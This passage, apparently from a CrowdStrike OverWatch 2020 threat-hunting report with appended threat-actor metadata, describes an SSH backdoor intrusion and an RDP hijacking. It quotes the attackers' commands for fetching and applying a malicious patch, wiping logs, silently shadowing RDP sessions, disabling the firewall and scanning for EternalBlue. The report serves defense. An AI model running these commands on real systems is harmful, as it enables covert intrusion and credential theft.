server and\ninstalled a backdoored version of the SSH service. The malicious SSH service allowed\nthe actor access to the host via a magic password and collected credentials of the\nexisting users as they authenticated to the host. This intrusion provided information\nabout the workflow of the actor and insights into their possible next steps. While the\nintrusion itself appears to be opportunistic in nature, the actor went to great lengths\nto install the malicious SSH service and evade detection. The actor likely planned to\nreturn later to collect credentials and conduct additional actions on the host.\n\n###### INITIAL ACCESS DISCOVERY PERSISTENCE CREDENTIAL ACCESS DEFENSE EVASION\n\nExploitation of Actor looked for Actor modified Modified SSHD Actor altered\nan unknown native tools an existing SSH captured the new SSH\nservice capable of with a patch to credentials on source code to\n\ncompiling enable malicious the host, staging mimic the\nsource code functionality for later existing version\n\nexfiltration and removed log\n\nfile entries\n\n###### WATCHING FOR BURSTS OF ACTIVITY\n\nThis intrusion highlights two important practices that are paramount to any\norganization’s security. The first is prioritizing basic IT hygiene to reduce the likelihood\nof avoidable intrusions. In this case, the actor achieved initial access through the\ncompromise of an unpatched externally available service. The second important\npractice is continuous threat hunting in your environment to discover and disrupt\nattacks such as this. The actor in question did not use known malicious tools to\nestablish persistence and credential-harvesting capabilities on this host. Instead,\nthey used legitimate source code for the SSH service and applied a patch to enable\nthe malicious capabilities. OverWatch discovered this activity by watching for\nunusual chains of commands being run in a narrow time window. In this case, the\ncombination of code being compiled and the use of the touch command — used to\nmodify timestamps — alerted threat hunters to potentially malicious activity. They\nthen notified the victim, enabling the organization to remove the intruder from the host\nbefore credentials were compromised or further activity occurred on the host.\n\n\n-----\n\n###### DOWNLOAD AND COMPILATION OF MALICIOUS SOURCE CODE\n\nShortly after gaining initial access, the threat actor began preparing the host to\ncapture and store credentials for later access. The actor checked for several software\npackages on the host to verify it was capable of compiling source code. They then\nused wget to download the source code for SSH and a malicious software patch.\nThe actor moved the source code to /var/tmp and patched the SSH source code\nto enable the malicious functionality. With this complete, they began compiling the\nsource code in preparation for installation. The following is a summarized list of\ncommands observed as part of these efforts:\n\n- wget -t 5 hxxp://mirror.yandex[.]ru/pub/OpenBSD/OpenSSH/\nportable/openssh-6.6p1.tar.gz\n\n- tar xfz openssh-6.6p1.tar.gz\n\n- mv openssh-6.6p1.tar.gz /var/tmp/\n\n- wget -t 5 --no-check-certificate hxxps://raw.github[.]\ncom/<redacted>/gh-pages/c3Y7310s.css\n\n- patch -p0 -i c3Y7310s.css\n\nOnce the source code was compiled, the actor then began moving the new SSH\nbinaries into place on the host. They then restarted the SSH service to execute the\nmodified SSHD binary with the malicious functionality:\n\n- mv -f ./ssh /usr/bin/ssh\n\n- mv -f ./scp /usr/bin/scp\n\n- mv -f ./sshd /usr/sbin/sshd\n\n- /bin/sh /usr/sbin/service sshd restart\n\nNow that the attacker had the malicious SSH service running on the host, they pivoted\nto covering their tracks to avoid detection.\n\n###### ATTEMPTS TO EVADE DETECTION\n\nEven before executing the compilation of the SSH source code, the actor began\nworking on evasion. They had observed that the version of SSH they planned to install\nwas different from the version already running on the system. To avoid the risk of\ndefenders noticing the mismatch of versions, the actor updated the source code to\ndisplay inaccurate version information:\n\n- perl -Upi -e s/OpenSSH_6.6p1/OpenSSH_7.4p1/ version.h\n\n- perl -Upi -e s/options->version_addendum = NULL/options>version_addendum = NULL/ servconf.c\n\nOnce the new SSH binaries were installed, they began removing source code and scripts\nfrom the file system. This consisted of a number of file and directory deletion commands:\n\n- rm -rf /var/tmp/messages\n\n- rm -rf /var/tmp/[REDACTED]\n\n\n-----\n\n- rm -rf openssh-6.6p1*\n\n- rm -rf /var/tmp/install_ssh.pl\n\n- rm -rf ...\n\n- rm -rf /var/tmp/clean_logs.pl\n\nThe actor also took care to remove log file entries based on the timestamp of entries\nand the actor’s IP address. To do this, they copied the /var/log/messages log file\nto /var/tmp/messages, removed all entries with a specific timestamp and then\noverwrote the original /var/log/messages file. They also executed a Perl script that\nappears to remove entries containing a specified IP address from log files on the host.\nAn unknown binary or script was also executed from a directory named “...” that\nappears to remove a specified IP address from log files. The name of this directory\nwas also likely an attempt to avoid discovery.\n\n- cp /var/log/messages /var/tmp/messages\n\n- sh -c cat /var/tmp/messages | grep -v \"<date>\" > /var/log/\nmessages\n\n- perl /var/tmp/clean_logs.pl <IP address>\n\n- bash -c cd /var/tmp; perl /var/tmp/clean_logs.pl <IP address>\n2>&1;rm -rf /var/tmp/clean_logs.pl\n\n- ./.../0 -i <IP address> -m /var/log/all.log /var/log/messages /\nvar/log/auth.log /var/log/secure /var/log/debug.log /var/log/\nlastlog /var/log/btmp\n\nOnce these actions were completed, the actor disconnected from the host. OverWatch\nnotified the victim of the activity as soon as it was discovered, enabling the victim to\nrespond and successfully removed the actor from the host before any significant impact\noccurred. No further malicious actions were observed after this point.\n\n###### CONCLUSIONS AND RECOMMENDATIONS\n\nThis intrusion demonstrates the need for in-depth security monitoring and threat\nhunting. Host-integrity monitoring will detect the modification of files on the system,\nbut security staff need to be constantly monitoring for these changes to respond\nbefore an actor can establish a foothold or complete their mission objective.\n\nThere are several layered defenses that need to be in place to protect organizations\nfrom attacks such as this. First, organizations must ensure that all of their systems\nare running the latest system patches and closely monitor for systems that have not\nbeen updated. Organizations also need to have security monitoring that is capable\nof detecting updates to system files and the commands run by a system’s users.\nDefenders should ensure endpoint detection and response (EDR) is deployed to all\nof their systems so that there are no blind spots in the network. Finally, continuous\nthreat hunting is a key defense for discovering malicious hands-on-keyboard activities\nquickly and understanding the context of a chain of commands being executed by a\nthreat actor. IT staff may not fully understand what they are seeing when confronted\nby activity like this, but an experienced threat hunting team like OverWatch provides\ndeep expertise in detecting these adversaries.\n\n\n-----\n\n###### SPIDER USES UNCOMMONLY SEEN TRADECRAFT IN AN ATTEMPT TO ESTABLISH FOOTHOLD IN A VICTIM ENVIRONMENT\n\n OVERVIEW\n\nOverWatch has tracked a continued escalation of eCrime intrusion activity in the first\nhalf of 2020. There is wide variation in the skills and sophistication of these eCrime\nadversaries; while some leverage commodity malware to conduct relatively basic\ninteractive campaigns, others employ less commonly seen hands-on-keyboard TTPs.\nIn early June, OverWatch discovered an intrusion against a transport and logistics\ncompany in the Asia-Pacific region in which a suspected eCrime adversary used RDP\nsession hijacking and proceeded to conduct port scans and credential dumping in\npursuit of their objectives.\n\n###### INITIAL ACCESS LATERAL MOVEMENT DEFENSE EVASION CREDENTIAL ACCESS\n\nThe actor gained The actor scanned for The actor attempted The actor\naccess via active RDP sessions to bypass security performed\ninternet- and hijacked a session using the AMSI credential\nexposed RDP with a silent bypass and by dumping via Task\n\nconnection modifying firewall Manager\n\nsettings\n\n###### RDP SESSION SHADOW HIJACKED TO FACILITATE LATERAL MOVEMENT\n\nAn OverWatch threat hunter searching for unusual port scanning discovered an\nadministrative account using Advanced IP Scanner, a utility commonly deployed to\nenumerate available network resources. This activity prompted deeper investigation,\nand the hunter discovered multiple failed login attempts to the RDP service. This type of\npassword-guessing attack is commonly used as an initial access vector for adversaries\nwhen services such as RDP are exposed to the internet. Notably, a large number of\nthese attempts originated from a network firewall appliance, suggesting RDP was portforwarded from an external source to the victim host. The brute-forcing attack resulted\nin the actor gaining access.\n\nOnce on the system, the actor enumerated the active RDP sessions using\nqwinsta.exe in an attempt to determine which RDP session to control. They then\nattempted to use the Windows-native binary tscon.exe to connect to an alternative\nsession in order to identify a user with higher privileges — however, this was blocked by\nthe Falcon sensor. The actor shifted gears and modified a registry key to enable remote\n\n\n-----\n\ndesktop session shadowing mode, which allows for users with administrator privileges\nto view or take control of RDP sessions:\n\nreg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal\nServices\" /v Shadow /t REG_DWORD /d 2 /f\n\nThis was followed by the actor initiating a remote connection in an elevated command\nprompt that allows for a silent connection:\n\nmstsc.exe /control /noConsentPrompt /shadow:1 /v:localhost\n\nThis approach aimed at exploiting RDP proved to be successful. The actor was able to\nstealthily hijack an active session — without providing credentials or notifying the user\nof their presence on the system — in order to continue their actions on objectives. The\ntradecraft used to exploit RDP in this intrusion is not commonly seen executed during\nthe course of criminally motivated attacks.\n\n###### ATTEMPTS TO BYPASS SECURITY CONTROLS TO FACILITATE USE OF AN EXPLOIT KIT\n\nThe operator made several attempts to execute PowerShell Empire, including the use\nof PowerView, Kerberoast, PowerUp and Mimikatz. Additionally, the actor attempted\nthe password recovery tool LaZagne, but execution of the suite of actor tooling was\nrepeatedly blocked by the Falcon sensor. Not content to give up, the actor attempted\nto evade security controls through the use of the Anti-Malware Scan Interface (AMSI)\nbypass technique. Avoiding AMSI sting-based controls can enable an actor to execute\ntheir malicious scripts while remaining hidden.\n\nIn a further attempt to avoid interruption by installed security software, the actor\ndisabled the Windows firewall using the following command:\n\nC:\\WINDOWS\\system32\\netsh.exe\" advfirewall set allprofiles state off\n\n###### COMMON WINDOWS UTILITY USED TO HARVEST CREDENTIALS ON A NEW HOST\n\nHaving failed to execute their tools on the initial host, the actor began to search for a\nnew target. Using tools downloaded from Google Drive, the actor conducted network\nreconnaissance that included port scans using nmap.exe and rdpscan.exe in an\nattempt to discover Windows hosts vulnerable to the SMBv1 EternalBlue exploit in the\nenvironment as well as potential candidates for lateral movement.\n\n\"C:\\Temp\\nmap-7.70\\nmap.exe\" -v --open -p445 -Pn --script=smbvuln-ms17-010 -sC -sV -oA result [IP REDACTED]\n\n\"C:\\Temp\\nmap-7.70\\rdpscan.exe\" [IP REDACTED]\n\nAfter identifying a new target, the actor leveraged RDP to move laterally to a remote\nhost. In an attempt to steal credentials from the system, the actor leveraged the\nWindows utility Task Manager to harvest credentials by dumping the contents of the\nLSASS process memory before archiving the output file using 7-Zip in preparation for\nlikely exfiltration. The use of taskmgr.exe has been observed frequently in recent\nattacks, as it can enable adversaries to blend in with normal admin operations and\navoid discovery.\n\n\n-----\n\n###### CONCLUSIONS AND RECOMMENDATIONS\n\nOverWatch’s human-led proactive and continuous hunting operations resulted in prompt\ndiscovery and notification of this malicious activity, allowing the victim organization to\nquickly disrupt the adversary before data exfiltration could occur. The victim was able\nto leverage the Falcon console to immediately network contain the host to avoid any\nsignificant impact. The use of various living-off-the-land techniques employed by this\nadversary underscores the importance of continuous threat hunting to uncover activity\nthat attempts to blend into normal everyday activity.\n\nOverWatch consistently sees adversaries gain access using stolen credentials to\nconnect via exposed RDP services. This is a threat potentially facing many organizations\nthat rapidly enabled a remote workforce as the COVID-19 pandemic hit. Organizations\nshould review any new infrastructure and remote work security policies as a priority. The\nbest way to mitigate against this threat is to not expose RDP to the internet. In those\ninstances where that is not possible, defenders should consider continuously monitoring\nfor unusual account behavior. Further, RDP exploits are commonly preceded by bruteforcing or password-spraying attacks so it's imperative that defenders employ strong\npassword policies in their environment as well. This should include the use of multifactor\nauthentication.\n\n\n-----\n\n#### CONCLUSION\n\n\nIn the first half of 2020, OverWatch witnessed a surge in interactive intrusions driven\npredominantly by eCrime activity. Although the escalation of criminally motivated\nintrusions is the continuation of a trend reported by CrowdStrike in late 2019, it is\nprobable that this trend has been exacerbated by the rapid adoption of work-fromhome practices and the resultant setup of new infrastructure that contributed to an\nexpanded attack surface.\n\nOverWatch threat hunting data also revealed a significant spike in malicious activity\nimpacting the manufacturing sector attributed to both eCrime and state-sponsored activity.\nOther fluctuations in the relative frequency of intrusions in specific industry verticals\ndemonstrates clearly that the cyber threat landscape is intrinsically linked to global\neconomic forces and has not escaped the upheaval caused by the COVID-19 pandemic.\n\nSo far in 2020, eCrime adversaries have increased not just the volume but also the reach\nof their hands-on-keyboard activities. In only six months, 27 industry verticals fell victim to\ncriminally motivated intrusions. This is more than double the number of industries that had\nfallen victim to eCrime at the same point in 2019. State-sponsored adversaries also remain\na significant threat, with their presence being felt across the board.\n\nFinally, defenders in today’s environment need to be aware that eCrime operations are not\nonly prolific but are also being run like businesses. Threat actors are continually innovating\nand maturing their processes to maximize their impact and ultimately their profit margins.\nAnalysis of interactive intrusions using the MITRE ATT&CK framework shows significant\noverlap in the TTPs of eCrime and state-sponsored adversaries.\n\n\n-----\n\n###### RECOMMENDATIONS\n\nThere has been a proliferation of interactive cyber campaigns in the first half of 2020, but\nwith OverWatch monitoring 24/7/365, adversaries have nowhere to hide. This report has\nexplored the key trends that have emerged so far in 2020 and some particular threats for\ndefenders to be alert to. But importantly, OverWatch threat hunting data emphasizes that\nadversaries are keenly attuned to their victim’s environment and ready to pivot to meet\nchanging objectives or emerging opportunities. In this fast-moving reality, it is imperative\nthat organizations are prepared to defend their environments.\n\n**•** **Roll it out! Turn it on! It is crucial to have comprehensive security countermeasures**\nand to enable the prevention capabilities in the products you use. Defenders\nshould ensure EDR is deployed to all of their systems so that there are no blind\nspots in the network. Defenders should also consider countermeasures such\nas allowlisting to help restrict program execution based on non-name-based file\nattributes.\n\n**•** **Invest in expert human threat hunting. Interactive attacks use stealthy or novel**\ntechniques designed to bypass automated monitoring and detection. Continuous\nthreat hunting is the best way to detect and prevent sophisticated or persistent\nattacks.\n\n**•** **Practice good hygiene. As a baseline, organizations should establish control**\nover the software running in their environment and eliminate unneeded software.\nIt is also crucial to ensure that the environment is kept up to date with the latest\npatches.\n\n**•** **Protect your identity. Use of valid accounts continues to be among the most**\ncommonly seen techniques employed by adversaries. Defenders should establish\nand enforce strong password policies and should be routinely monitoring\nauthentication logs, account creation and changes in user privileges.\n\n**•** **Enlist your users in the fight. While technology is clearly critical in the fight to**\ndetect and stop intrusions, the end user remains a crucial link in the chain to stop\nbreaches. Well-trained staff can be an asset in combating the continued threat of\nphishing and related social engineering techniques.\n\n\n-----\n\n## ABOUT CROWDSTRIKE\n\nCrowdStrike® Inc. (Nasdaq: CRWD), a global cybersecurity leader, is redefining\nsecurity for the cloud era with an endpoint protection platform built from\nthe ground up to stop breaches. The CrowdStrike Falcon® platform’s single\nlightweight-agent architecture leverages cloud-scale artificial intelligence (AI) and\noffers real-time protection and visibility across the enterprise, preventing attacks\n[on endpoints on or off the network. Powered by the proprietary CrowdStrike Threat](https://www.crowdstrike.com/resources/data-sheets/threat-graph/)\n[Graph®, CrowdStrike Falcon correlates over 3 trillion endpoint-related events per](https://www.crowdstrike.com/resources/data-sheets/threat-graph/)\nweek in real time from across the globe, fueling one of the world’s most advanced\ndata platforms for security.\n\nWith CrowdStrike, customers benefit from better protection, better performance\nand immediate time-to-value delivered by the cloud-native Falcon platform.\n\nThere’s only one thing to remember about CrowdStrike: We stop breaches.\n\n## PRODUCTS AND SERVICES\n\n###### Endpoint Security\n\n**[FALCON INSIGHT[TM] | ENDPOINT DETECTION AND RESPONSE (EDR)](https://www.crowdstrike.com/endpoint-security-products/falcon-insight-endpoint-detection-response/)**\nDelivers continuous, comprehensive endpoint visibility that spans detection,\nresponse and forensics to ensure nothing is missed and potential breaches are\nstopped.\n\n**[FALCON PREVENT[TM] | NEXT-GENERATION ANTIVIRUS](https://www.crowdstrike.com/endpoint-security-products/falcon-prevent-endpoint-antivirus/)**\nProtects against both malware and malware-free attacks and is third-party tested\nand certified, allowing organizations to replace their AV.\n\n**[FALCON FIREWALL MANAGEMENT[TM] | FIREWALL MANAGEMENT](https://www.crowdstrike.com/endpoint-security-products/falcon-firewall-management/)**\nDelivers simple, centralized host firewall management making it easy to manage\nand control host firewall policies.\n\n**[FALCON DEVICE CONTROL[TM] | USB DEVICE VISIBILITY AND CONTROL](https://www.crowdstrike.com/endpoint-security-products/falcon-endpoint-device-control/)**\nProvides the visibility and precise control required to enable safe usage of USB\ndevices across your organization.\n\n\n-----\n\n###### Cloud Security\n\n**[FALCON CLOUD WORKLOAD PROTECTION[TM ]](https://www.crowdstrike.com/cloud-security-products/falcon-cloud-workload-protection/)**\n\nProvides comprehensive breach protection across private, public, hybrid and multicloud environments, allowing customers to rapidly adopt and secure technology\nacross any workload.\n\n###### Security & IT Operations\n\n**[FALCON DISCOVER[TM] | IT HYGIENE](https://www.crowdstrike.com/endpoint-security-products/falcon-discover-network-security-monitoring/)**\nIdentifies unauthorized systems and applications anywhere in your environment in\nreal time, enabling faster remediation to improve your overall security posture.\n\n**[FALCON SPOTLIGHT[TM] | VULNERABILITY MANAGEMENT](https://www.crowdstrike.com/endpoint-security-products/falcon-spotlight-vulnerability-management/)**\nOffers security teams a continuous and real-time assessment of the vulnerability\nexposure of their endpoints, without resource-intensive scans.\n\n###### Managed Services\n\n**[FALCON OVERWATCH[TM] | MANAGED THREAT HUNTING](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/)**\nCrowdStrike's 24/7 hunting team seamlessly augments your in-house security\nresources to relentlessly hunt for malicious activities at the earliest stage, stopping\nadversaries in their tracks.\n\n**[FALCON COMPLETE[TM] | TURNKEY SECURITY](https://www.crowdstrike.com/endpoint-security-products/falcon-complete/)**\nCombines comprehensive Falcon endpoint protection with the Falcon Complete\nTeam of security experts, providing 100% managed and worry-free cybersecurity\nthat includes a product warranty of up to $1 million.\n\n\n-----\n\n###### Threat Intelligence\n\n**[FALCON X[TM] | THREAT ANALYSIS SERVICE](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/)**\nAutomates threat analysis, enabling security teams to learn from encounters with\nadversaries and use that knowledge to protect against future attacks.\n\n**[FALCON X PREMIUM[TM] | CYBER THREAT INTELLIGENCE](https://www.crowdstrike.com/endpoint-security-products/falcon-x-threat-intelligence/premium/)**\nDelivers strategic reports and tactical indicators of compromise that provide\ninsight into every aspect of the threat actors that are targeting your organization.\n\n**[FALCON SEARCH[TM] | MALWARE SEARCH](https://www.crowdstrike.com/endpoint-security-products/falcon-cyber-threat-search-engine/)**\nDramatically increases the speed of malware research, enabling teams to quickly\nimplement defensive measures, understand the attackers' motives, and even\ndownload related files for further study.\n\n**[FALCON SANDBOX[TM] | MALWARE ANALYSIS](https://www.crowdstrike.com/endpoint-security-products/falcon-sandbox-malware-analysis/)**\nProvides visibility into malware behavior, automating in-depth file and memory\nanalysis for faster threat protection and response.\n\n###### Services\n\n**[CROWDSTRIKE SERVICES | IR AND PROACTIVE](https://www.crowdstrike.com/services/)**\nDelivers pre- and post-incident response (IR) services 24/7 to support you before,\nduring or after a breach, with skilled teams to help you defend against and respond\nto security incidents, prevent breaches and optimize your speed to remediation.\n\n###### Start Free Trial of Next-Gen AV\n\n[Learn more at www.crowdstrike.com](http://crowdstrike.com/)\n\n© 2020 CrowdStrike, Inc. All rights reserved.\n\n\n###### Start Free Trial of Next-Gen AV\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020OverWatchNowheretoHide.pdf"
    ],
    "report_names": [
        "Report2020OverWatchNowheretoHide.pdf"
    ],
    "threat_actors": [
        {
            "id": "1ed75079-f888-43b3-af65-f4ff97f91ba5",
            "created_at": "2022-10-25T16:07:23.286995Z",
            "updated_at": "2025-03-27T02:02:10.178487Z",
            "deleted_at": null,
            "main_name": "Tracer Kitten",
            "aliases": [],
            "source_name": "ETDA:Tracer Kitten",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "514a85a9-76e4-46fe-a6fa-98d15fcecc80",
            "created_at": "2023-01-06T13:46:39.172445Z",
            "updated_at": "2025-03-27T02:00:03.012557Z",
            "deleted_at": null,
            "main_name": "TRACER KITTEN",
            "aliases": [],
            "source_name": "MISPGALAXY:TRACER KITTEN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
